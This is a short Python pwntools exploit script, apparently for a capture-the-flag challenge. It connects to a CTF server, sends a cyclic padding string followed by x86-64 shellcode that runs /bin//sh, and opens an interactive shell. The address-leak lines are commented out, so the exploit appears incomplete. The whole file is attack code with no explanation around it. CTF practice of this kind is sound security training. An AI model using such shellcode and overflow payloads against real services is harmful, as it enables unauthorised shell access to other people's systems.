from pwn import *
import struct

# print(cyclic(1000))

ip = 'ctf.adl.tw'
port = 11000
r = remote(ip, port)

shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab"
# payload += p64(0x0)
# address = r.recv()
# print("address: " + address)
# payload += p64(address)
# payload += p64(int(address.decode(),16))
# print(payload)

payload += shellcode

r.sendline(payload)
r.interactive()

